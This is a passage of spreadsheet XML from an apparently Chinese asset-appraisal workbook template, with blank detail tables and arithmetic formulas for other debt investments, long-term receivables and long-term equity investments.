      <c r="F28" s="565" t="n"/>
      <c r="G28" s="597" t="inlineStr"/>
      <c r="H28" s="555">
        <f>H26-H27</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>I26-I27</f>
        <v/>
      </c>
      <c r="J28" s="555">
        <f>J26-J27</f>
        <v/>
      </c>
      <c r="K28" s="555">
        <f>J28-I28</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>IF(I28=0,"",K28/I28*100)</f>
        <v/>
      </c>
      <c r="M28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="5">
    <mergeCell ref="B2:M2"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="B1:M1"/>
    <mergeCell ref="B27:C27"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:M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7222222222222"/>
  <pageSetup orientation="landscape" paperSize="9" scale="96" fitToHeight="0" blackAndWhite="1"/>
  <headerFooter scaleWithDoc="0"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 codeName="Sheet42">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:M28"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.5" customWidth="1" style="410" min="1" max="1"/>
    <col width="9" customWidth="1" style="410" min="2" max="2"/>
    <col width="17.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="8.16666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="7.83333333333333" customWidth="1" style="410" min="5" max="5"/>
    <col width="9" customWidth="1" style="410" min="6" max="6"/>
    <col width="9.33333333333333" customWidth="1" style="410" min="7" max="7"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="8" max="9"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="10" max="11"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="12" max="12"/>
    <col width="9.66666666666667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其他债权投资评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customHeight="1" s="415">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547" t="inlineStr">
        <is>
          <t>评估基准日：2018年5月31日</t>
        </is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373" t="n"/>
      <c r="M3" s="402" t="inlineStr">
        <is>
          <t>表4-2</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customHeight="1" s="415">
      <c r="A4" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B4" s="549" t="inlineStr">
        <is>
          <t>被评估单位：ABC公司</t>
        </is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291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被投资单位名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>债券种类</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>发行日期</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>到期日</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>票面利率%</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>成本（面值）</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="K5" s="17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Height="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="380" t="n"/>
      <c r="E6" s="578" t="n"/>
      <c r="F6" s="578" t="n"/>
      <c r="G6" s="380" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555">
        <f>J6-I6</f>
        <v/>
      </c>
      <c r="L6" s="555">
        <f>IF(I6=0,"",K6/I6*100)</f>
        <v/>
      </c>
      <c r="M6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="578" t="n"/>
      <c r="F7" s="578" t="n"/>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555">
        <f>J7-I7</f>
        <v/>
      </c>
      <c r="L7" s="555">
        <f>IF(I7=0,"",K7/I7*100)</f>
        <v/>
      </c>
      <c r="M7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="578" t="n"/>
      <c r="F8" s="578" t="n"/>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555">
        <f>J8-I8</f>
        <v/>
      </c>
      <c r="L8" s="555">
        <f>IF(I8=0,"",K8/I8*100)</f>
        <v/>
      </c>
      <c r="M8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="578" t="n"/>
      <c r="F9" s="578" t="n"/>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555">
        <f>J9-I9</f>
        <v/>
      </c>
      <c r="L9" s="555">
        <f>IF(I9=0,"",K9/I9*100)</f>
        <v/>
      </c>
      <c r="M9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="578" t="n"/>
      <c r="F10" s="578" t="n"/>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555">
        <f>J10-I10</f>
        <v/>
      </c>
      <c r="L10" s="555">
        <f>IF(I10=0,"",K10/I10*100)</f>
        <v/>
      </c>
      <c r="M10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="578" t="n"/>
      <c r="F11" s="578" t="n"/>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555">
        <f>J11-I11</f>
        <v/>
      </c>
      <c r="L11" s="555">
        <f>IF(I11=0,"",K11/I11*100)</f>
        <v/>
      </c>
      <c r="M11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="578" t="n"/>
      <c r="F12" s="578" t="n"/>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555">
        <f>J12-I12</f>
        <v/>
      </c>
      <c r="L12" s="555">
        <f>IF(I12=0,"",K12/I12*100)</f>
        <v/>
      </c>
      <c r="M12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="578" t="n"/>
      <c r="F13" s="578" t="n"/>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555">
        <f>J13-I13</f>
        <v/>
      </c>
      <c r="L13" s="555">
        <f>IF(I13=0,"",K13/I13*100)</f>
        <v/>
      </c>
      <c r="M13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="578" t="n"/>
      <c r="F14" s="578" t="n"/>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555">
        <f>J14-I14</f>
        <v/>
      </c>
      <c r="L14" s="555">
        <f>IF(I14=0,"",K14/I14*100)</f>
        <v/>
      </c>
      <c r="M14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="578" t="n"/>
      <c r="F15" s="578" t="n"/>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555">
        <f>J15-I15</f>
        <v/>
      </c>
      <c r="L15" s="555">
        <f>IF(I15=0,"",K15/I15*100)</f>
        <v/>
      </c>
      <c r="M15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="578" t="n"/>
      <c r="F16" s="578" t="n"/>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555">
        <f>J16-I16</f>
        <v/>
      </c>
      <c r="L16" s="555">
        <f>IF(I16=0,"",K16/I16*100)</f>
        <v/>
      </c>
      <c r="M16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="578" t="n"/>
      <c r="F17" s="578" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555">
        <f>J17-I17</f>
        <v/>
      </c>
      <c r="L17" s="555">
        <f>IF(I17=0,"",K17/I17*100)</f>
        <v/>
      </c>
      <c r="M17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="578" t="n"/>
      <c r="F18" s="578" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555">
        <f>J18-I18</f>
        <v/>
      </c>
      <c r="L18" s="555">
        <f>IF(I18=0,"",K18/I18*100)</f>
        <v/>
      </c>
      <c r="M18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="578" t="n"/>
      <c r="F19" s="578" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555">
        <f>J19-I19</f>
        <v/>
      </c>
      <c r="L19" s="555">
        <f>IF(I19=0,"",K19/I19*100)</f>
        <v/>
      </c>
      <c r="M19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="578" t="n"/>
      <c r="F20" s="578" t="n"/>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555">
        <f>J20-I20</f>
        <v/>
      </c>
      <c r="L20" s="555">
        <f>IF(I20=0,"",K20/I20*100)</f>
        <v/>
      </c>
      <c r="M20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="578" t="n"/>
      <c r="F21" s="578" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555">
        <f>J21-I21</f>
        <v/>
      </c>
      <c r="L21" s="555">
        <f>IF(I21=0,"",K21/I21*100)</f>
        <v/>
      </c>
      <c r="M21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="578" t="n"/>
      <c r="F22" s="578" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555">
        <f>J22-I22</f>
        <v/>
      </c>
      <c r="L22" s="555">
        <f>IF(I22=0,"",K22/I22*100)</f>
        <v/>
      </c>
      <c r="M22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="578" t="n"/>
      <c r="F23" s="578" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555">
        <f>J23-I23</f>
        <v/>
      </c>
      <c r="L23" s="555">
        <f>IF(I23=0,"",K23/I23*100)</f>
        <v/>
      </c>
      <c r="M23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="578" t="n"/>
      <c r="F24" s="578" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555">
        <f>J24-I24</f>
        <v/>
      </c>
      <c r="L24" s="555">
        <f>IF(I24=0,"",K24/I24*100)</f>
        <v/>
      </c>
      <c r="M24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="578" t="n"/>
      <c r="F25" s="578" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555">
        <f>J25-I25</f>
        <v/>
      </c>
      <c r="L25" s="555">
        <f>IF(I25=0,"",K25/I25*100)</f>
        <v/>
      </c>
      <c r="M25" s="383" t="n"/>
    </row>
    <row r="26" ht="17.25" customHeight="1" s="415">
      <c r="A26" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B26" s="284" t="inlineStr">
        <is>
          <t>合    计</t>
        </is>
      </c>
      <c r="C26" s="567" t="n"/>
      <c r="D26" s="596" t="n"/>
      <c r="E26" s="565" t="n"/>
      <c r="F26" s="565" t="n"/>
      <c r="G26" s="597" t="inlineStr"/>
      <c r="H26" s="555">
        <f>ROUND(SUM(H6:H25),2)</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>ROUND(SUM(I6:I25),2)</f>
        <v/>
      </c>
      <c r="J26" s="555">
        <f>ROUND(SUM(J6:J25),2)</f>
        <v/>
      </c>
      <c r="K26" s="555">
        <f>J26-I26</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>IF(I26=0,"",K26/I26*100)</f>
        <v/>
      </c>
      <c r="M26" s="383" t="n"/>
    </row>
    <row r="27" ht="17.25" customHeight="1" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="284" t="inlineStr">
        <is>
          <t>减：减值准备</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="596" t="n"/>
      <c r="E27" s="565" t="n"/>
      <c r="F27" s="565" t="n"/>
      <c r="G27" s="597" t="inlineStr"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555">
        <f>J27-I27</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>IF(I27=0,"",K27/I27*100)</f>
        <v/>
      </c>
      <c r="M27" s="383" t="n"/>
    </row>
    <row r="28" ht="17.25" customHeight="1" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B28" s="284" t="inlineStr">
        <is>
          <t>合    计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="596" t="n"/>
      <c r="E28" s="565" t="n"/>
      <c r="F28" s="565" t="n"/>
      <c r="G28" s="597" t="inlineStr"/>
      <c r="H28" s="555">
        <f>H26-H27</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>I26-I27</f>
        <v/>
      </c>
      <c r="J28" s="555">
        <f>J26-J27</f>
        <v/>
      </c>
      <c r="K28" s="555">
        <f>J28-I28</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>IF(I28=0,"",K28/I28*100)</f>
        <v/>
      </c>
      <c r="M28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="5">
    <mergeCell ref="B2:M2"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="B1:M1"/>
    <mergeCell ref="B27:C27"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:M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7222222222222"/>
  <pageSetup orientation="landscape" paperSize="9" scale="97" fitToHeight="0" blackAndWhite="1"/>
  <headerFooter scaleWithDoc="0"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 codeName="Sheet43">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:J28"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="15.1666666666667" customWidth="1" style="410" min="1" max="1"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="23.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="17.1666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="13.5" customWidth="1" style="410" min="5" max="5"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="7" max="8"/>
    <col outlineLevel="1" width="9.66666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="14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长期应收款评估明细表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373" t="n"/>
      <c r="G3" s="373" t="n"/>
      <c r="H3" s="373" t="n"/>
      <c r="I3" s="402" t="inlineStr">
        <is>
          <t>表4-3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586" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="376" t="n"/>
      <c r="I4" s="176" t="n"/>
      <c r="J4" s="176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欠款单位名称（结算对象)</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>业务内容</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="H5" s="170" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="I5" s="185" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="380" t="n"/>
      <c r="E6" s="578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Height="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="578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Height="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="578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6.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="578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6.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="578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Height="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="578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Height="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="578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Height="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="578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Height="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="578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Height="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="578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Height="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="578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Height="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="578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Height="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="578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Height="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="578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Height="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="578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Height="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="578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Height="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="578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Height="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="578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Height="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="578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Height="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="578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380" t="n"/>
      <c r="E26" s="115" t="n"/>
      <c r="F26" s="555">
        <f>ROUND(SUM(F6:F25),2)</f>
        <v/>
      </c>
      <c r="G26" s="555">
        <f>ROUND(SUM(G6:G25),2)</f>
        <v/>
      </c>
      <c r="H26" s="555">
        <f>G26-F26</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>IF(F26=0,"",H26/F26*100)</f>
        <v/>
      </c>
      <c r="J26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>减：长期应收款坏账准备</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="115" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555">
        <f>G27-F27</f>
        <v/>
      </c>
      <c r="I27" s="555">
        <f>IF(F27=0,"",H27/F27*100)</f>
        <v/>
      </c>
      <c r="J27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="383" t="n"/>
      <c r="E28" s="115" t="n"/>
      <c r="F28" s="555">
        <f>F26-F27</f>
        <v/>
      </c>
      <c r="G28" s="555">
        <f>G26-G27</f>
        <v/>
      </c>
      <c r="H28" s="555">
        <f>G28-F28</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>IF(F28=0,"",H28/F28*100)</f>
        <v/>
      </c>
      <c r="J28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="6">
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="B1:J1"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="B2:J2"/>
    <mergeCell ref="I3:J3"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:J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7222222222222"/>
  <pageSetup orientation="landscape" paperSize="9" scale="91" fitToHeight="0" blackAndWhite="1"/>
  <headerFooter scaleWithDoc="0"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 codeName="Sheet44">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:L29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A26" sqref="A26"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="14.1666666666667" customWidth="1" style="410" min="1" max="1"/>
    <col width="11" customWidth="1" style="410" min="2" max="2"/>
    <col width="19" customWidth="1" style="410" min="3" max="3"/>
    <col width="8.16666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="10" customWidth="1" style="410" min="5" max="5"/>
    <col width="13.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="7" max="8"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="9" max="10"/>
    <col outlineLevel="1" width="9.33333333333333" customWidth="1" style="410" min="11" max="11"/>
    <col width="10.1666666666667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长期股权投资评估明细表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402" t="inlineStr">
        <is>
          <t>表4-4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176" t="n"/>
      <c r="L4" s="176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被投资单位名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>投资日期</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>协议投资期限</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>持股比例（%）</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>投资成本</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
